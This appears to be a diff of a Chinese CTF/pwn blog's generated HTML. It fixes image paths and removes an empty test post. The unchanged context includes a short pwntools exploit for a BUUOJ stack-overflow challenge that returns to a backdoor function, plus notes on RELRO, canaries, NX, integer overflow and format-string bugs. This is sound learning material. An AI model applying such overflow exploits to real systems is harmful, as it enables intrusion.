@@ -103,7 +103,8 @@
 <img src="/2022/01/17/%E7%AE%80%E5%8D%95pwn%E6%80%9D%E8%B7%AF/image-20220118184447579.png" class title="This is an example image">
 
 <p>然后ida 一键F5 问就是懒</p>
-<p><img src="/2022/01/17/%E7%AE%80%E5%8D%95pwn%E6%80%9D%E8%B7%AF/image-20220118184547127.png" alt="image-20220118184547127"></p>
+<img src="/2022/01/17/%E7%AE%80%E5%8D%95pwn%E6%80%9D%E8%B7%AF/image-20220118184547127.png" class title="This is an example image">
+
 <p>明显一个栈溢出，没有canary ， 然后找找有无后门函数 </p>
 <p>好像有个good_game() 函数，行了直接写exp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">port = 27755</span><br><span class="line"></span><br><span class="line">return_add = 0x400620</span><br><span class="line"></span><br><span class="line">io = remote(ip,port)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27; * 0x88 +   p64(return_add).decode(&quot;iso-8859-1&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -151,7 +152,8 @@
         <p>上一篇零零散散的写了一些内容，这一篇还是零零散散写一些内容</p>
 <p>主要是基础知识简单介绍</p>
 <h3 id="常见保护措施"><a href="#常见保护措施" class="headerlink" title="常见保护措施"></a>常见保护措施</h3><p>用checksec就能直接看出来存在哪些保护措施</p>
-<p><img src="/.com//1.png"></p>
+<img src="/2022/01/17/%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD%E5%8F%8A%E7%BB%95%E8%BF%87/1.png" class title="This is an example image">
+
 <p>RELRO： RELocation Read-Only 针对 got 表的，简单理解为 call [so函数], 将该位置设置为不可写 。防止 got表劫持</p>
 <p>Canary:   在函数返回值之前放置 fs:[0x28] 的值，函数返回时校验该值，静态插桩实现。 减少栈溢出</p>
 <p>NX：Not eXecute 简单理解为 数据段不可执行，防止 shellcode。</p>
@@ -165,44 +167,6 @@
     </div>
     <footer class="article-footer">
       <a data-url="http://example.com/2022/01/17/%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD%E5%8F%8A%E7%BB%95%E8%BF%87/" data-id="ckyiomven0000m4v6gku37ctq" data-title="常见保护措施及绕过" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/01/12/test/" class="article-date">
-  <time class="dt-published" datetime="2022-01-12T13:14:53.000Z" itemprop="datePublished">2022-01-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/01/12/test/">test</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/01/12/test/" data-id="ckybkhp730000xkv63kmjgaop" data-title="test" class="article-share-link">Share</a>
       
       
       
@@ -248,9 +212,11 @@
 <h6 id="整形越界"><a href="#整形越界" class="headerlink" title="整形越界"></a>整形越界</h6><p>除了字符越界，别忘了还有整形，形如int , short , char 。整形越界又分两种。</p>
 <p>补码形如一个圆圈</p>
 <p>有符号情况下如下图所示，需要考虑 最大正数+1 &lt; 0 的情况</p>
-<p><img src="/.com//pwn1.png" alt="pwn1"></p>
+<img src="/2022/01/12/what-is-pwn/pwn1.png" class title="This is an example image">
+
 <p>无符号则要考虑另一个情况， 最大正数+1 == 0 的情况(文章同样还没写)</p>
-<p><img src="/.com//pwn2.png" alt="pwn2"></p>
+<img src="/2022/01/12/what-is-pwn/pwn2.png" class title="This is an example image">
+
 <h6 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h6><p>勉强也算在越界里吧，浮点数的0 不是 整形的0 。但是计算机可不记得它是什么类型 ，都是4 byte 。浮点数大致是 符号位 + 小数位 + 指数位。那么 浮点数(如 负0） 如果变成无符号整形就会变成一个很大的数。可能导致奇特的逻辑，从而被劫持控制流(同样未写)</p>
 <h6 id="不定参数函数-参数越界"><a href="#不定参数函数-参数越界" class="headerlink" title="不定参数函数(参数越界)"></a>不定参数函数(参数越界)</h6><p>确切来说应该叫格式化字符串漏洞。成因算是不定参数导致的。因为不确定参数的数量，一般会使用第一个参数作为参数数量的确定。之后具体分析吧，写过，但文章丢了。</p>
 <h5 id="条件竞争问题"><a href="#条件竞争问题" class="headerlink" title="条件竞争问题"></a>条件竞争问题</h5><p>一块空间，两个线程，都有写的权限。这个可以参照脏牛漏洞。</p>
@@ -363,10 +329,6 @@
         
           <li>
             <a href="/2022/01/17/%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD%E5%8F%8A%E7%BB%95%E8%BF%87/">常见保护措施及绕过</a>
-          </li>
-        
-          <li>
-            <a href="/2022/01/12/test/">test</a>
           </li>
         
           <li>
